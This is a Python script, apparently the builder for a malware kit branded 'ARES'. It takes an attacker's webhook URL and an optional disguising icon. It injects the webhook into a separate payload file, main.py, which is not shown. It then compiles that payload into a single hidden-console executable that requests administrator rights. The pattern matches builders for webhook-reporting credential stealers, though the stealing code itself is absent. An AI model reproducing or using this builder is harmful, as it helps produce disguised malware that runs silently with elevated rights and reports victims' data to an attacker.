import colorama
from colorama import Fore, Back, Style
import tkinter as tk
from tkinter import filedialog
import os
import subprocess
import sys
import time

colorama.init(autoreset=True)


def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print(f"{Fore.RED}╔══════════════════════════════════════════════════════╗")
    print(f"{Fore.RED}║ {Fore.CYAN}             ▄▄▄       ██▀███  ▓█████   ██████     {Fore.RED} ║")
    print(f"{Fore.RED}║ {Fore.CYAN}            ▒████▄    ▓██ ▒ ██▒▓█   ▀ ▒██    ▒     {Fore.RED} ║")
    print(f"{Fore.RED}║ {Fore.CYAN}            ▒██  ▀█▄  ▓██ ░▄█ ▒▒███   ░ ▓██▄       {Fore.RED} ║")
    print(f"{Fore.RED}║ {Fore.CYAN}            ░██▄▄▄▄██ ▒██▀▀█▄  ▒▓█  ▄   ▒   ██▒    {Fore.RED} ║")
    print(f"{Fore.RED}║ {Fore.CYAN}             ▓█   ▓██▒░██▓ ▒██▒░▒████▒▒██████▒▒    {Fore.RED} ║")
    print(f"{Fore.RED}║ {Fore.CYAN}             ▒▒   ▓▒█░░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▓▒ ▒ ░    {Fore.RED} ║")
    print(f"{Fore.RED}║ {Fore.CYAN}              ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ░  ░░ ░▒  ░ ░    {Fore.RED} ║")
    print(f"{Fore.RED}║ {Fore.CYAN}              ░   ▒     ░░   ░    ░   ░  ░  ░      {Fore.RED} ║")
    print(f"{Fore.RED}║ {Fore.CYAN}                  ░  ░   ░        ░  ░      ░      {Fore.RED} ║")
    print(f"{Fore.RED}╚══════════════════════════════════════════════════════╝")
    print()
    
    webhook = input(f"{Fore.CYAN}┌─{Fore.RED}root{Fore.WHITE}@{Fore.GREEN}ares{Fore.CYAN}─{Fore.YELLOW}[{Fore.MAGENTA}webhook{Fore.YELLOW}]{Fore.CYAN}─┐\n{Fore.CYAN}└─> {Fore.WHITE}")
    icon = input(f"{Fore.CYAN}┌─{Fore.RED}root{Fore.WHITE}@{Fore.GREEN}ares{Fore.CYAN}─{Fore.YELLOW}[{Fore.MAGENTA}icon [y/n]{Fore.YELLOW}]{Fore.CYAN}─┐\n{Fore.CYAN}└─> {Fore.WHITE}")
    
    icon_path = None
    if icon.lower().strip() == "y":
        root = tk.Tk()
        root.withdraw()
        
        print(f"{Fore.YELLOW}[*] {Fore.WHITE}Opening file explorer...")
        icon_path = filedialog.askopenfilename(
            title="Select Icon",
            filetypes=[("Icon files", "*.ico"), ("All files", "*.*")]
        )
        
        if icon_path:
            print(f"{Fore.GREEN}[✓] {Fore.WHITE}Icon selected")
        else:
            print(f"{Fore.RED}[!] {Fore.WHITE}No icon selected")
            icon_path = None

    try:
        if os.path.exists("main.py"):
            encodings = ['utf-8', 'utf-8-sig', 'latin-1', 'cp1252']
            content = None
            
            for encoding in encodings:
                try:
                    with open("main.py", "r", encoding=encoding) as file:
                        content = file.read()
                    break
                except UnicodeDecodeError:
                    continue
            
            if content is None:
                print(f"{Fore.RED}[!] {Fore.WHITE}Cannot read main.py")
                return
            
            mhk = content.replace('hk = "%WEBHOOk%"', f'hk = "{webhook}"')
            
            tf = "ares.py"
            with open(tf, "w", encoding='utf-8') as file:
                file.write(mhk)
            
            print(f"{Fore.GREEN}[✓] {Fore.WHITE}Webhook configured")
            print(f"{Fore.YELLOW}[*] {Fore.WHITE}Building executable...")
            
            pyinstaller_cmd = [
                "pyinstaller",
                "--onefile",
                "--noconsole",
                "--uac-admin",
                tf
            ]
            
            if icon_path:
                pyinstaller_cmd.extend(["--icon", icon_path])
            
            process = subprocess.run(pyinstaller_cmd, capture_output=True, text=True)
            
            if os.path.exists(tf):
                os.remove(tf)
            
            if process.returncode == 0:
                print(f"{Fore.GREEN}[✓] {Fore.WHITE}Build successful!")
                print(f"{Fore.GREEN}[✓] {Fore.WHITE}Executable ready in 'dist' folder")
            else:
                print(f"{Fore.RED}[!] {Fore.WHITE}Build failed")
        else:
            print(f"{Fore.RED}[!] {Fore.WHITE}main.py not found")
    
    except Exception as e:
        print(f"{Fore.RED}[!] {Fore.WHITE}Error: {str(e)}")
    
    input(f"{Fore.CYAN}[*] {Fore.WHITE}Press Enter to exit...")

if __name__ == "__main__":
    main()